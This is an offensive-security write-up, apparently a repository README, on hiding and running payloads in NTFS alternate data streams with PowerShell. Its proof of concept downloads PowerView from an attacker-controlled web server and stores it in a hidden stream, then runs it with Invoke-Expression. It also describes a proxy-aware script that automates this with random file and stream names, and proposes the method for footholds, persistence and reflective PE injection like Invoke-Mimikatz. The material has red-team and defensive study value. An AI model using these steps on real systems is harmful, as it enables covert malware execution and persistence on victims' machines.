# Alternate-Data-Streams with PowerShell

I literally stumbled upon this whilst reading up on the parameters for the Get-Content and Set-Content cmdlets for another piece of research.
The parameter that got my interest is -Stream which allows the user the ability to read and write NTFS alternate data streams.
If we create a file with the following commands;
```powershell
$file = "$env:TEMP\test.txt"
Set-Content -Path $file -Value 'Alternate Data Stream Test File'
```
To read the file content, we use the following;
```powershell
Get-Content -Path $file
```
Which will return;
```powershell
Alternate Data Stream Test File
```

## Hiding Content
As I mentioned above the -Stream parameter lets the user access the 'Hidden' NTFS Alternate Data Stream.
A simple example using the file created above;
```powershell
Add-Content -Path $file -Value 'Hidden Data' -Stream 'hiddenstream'

Get-Content -Path $file -Stream 'hiddenstream'
```
## Something More Useful
This is great, however not so much use, so what if we could hide something a touch more useful, say PowerView?
Taking the simple Proof of Concept - alternate-data-stream.txt from the repository, we create a new file as above, put some content in the file, however we now download a payload, (PowerView.ps1 in this example), from a webserver we control and hide it in an NFTS Alternate Data Stream, (called powerview).Finally we grab the content from the ADS and execute it.

```powershell
$file = "$env:TEMP\test.txt"
Set-Content -Path $file -Value 'Alternate Data Stream Test File'
Get-Content -Path $file
Alternate Data Stream Test File

$pvfile = Invoke-WebRequest -Uri http://192.168.0.105:8000/powerview.ps1
Add-Content -Encoding Byte -Path $file -Value $pvfile.Content -Stream 'powerview'
Invoke-Expression (Get-Content -Path $file -Stream 'powerview' -Raw)
```

Taking things further I put together a PowerShell script that creates a random filename with a randomish amount of random content and a random ADS name. The script asks the user for the uri of the payload downloads it and embeds into the ADS of the freshly created file.
The POC then retrieves and executes the downloaded content from the ADS of the random file. Also in this example the download process is able to detect webproxy settings and use the current user's credentials, (Proxy Aware).

## The script should be ran . sourced i.e.
```powershell
. ./Invoke-ADS.ps1
```
The screenshot below shows PowerView being pulled from a web server, being stored in a file/ADS then retrieved and executed.

![Alt text](./screenshots/invoke-ads-example.png?raw=true "Invoke-ADS example")

Further uses could be to download a payload, say a standard PoshC2 or Empire payload and hide it in ADS of a file and use this as the initial foothold and a persistence method.
Or perhaps a full executable stored in a PowerShell script and executed using Invoke-ReflectivePEInjection.ps1, similar to the way Invoke-Mimikatz.ps1 works.
If we look inside the Invoke-Mimikatz script the authors notes at around line 56 state 'This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY'

So to achieve a similar outcome with an executable of your making the process would be essentially just encode your exe and store in  $PEBytes and call the Invoke-ReflectivePEInjection function.

The options here are as broad and varied as your imagination.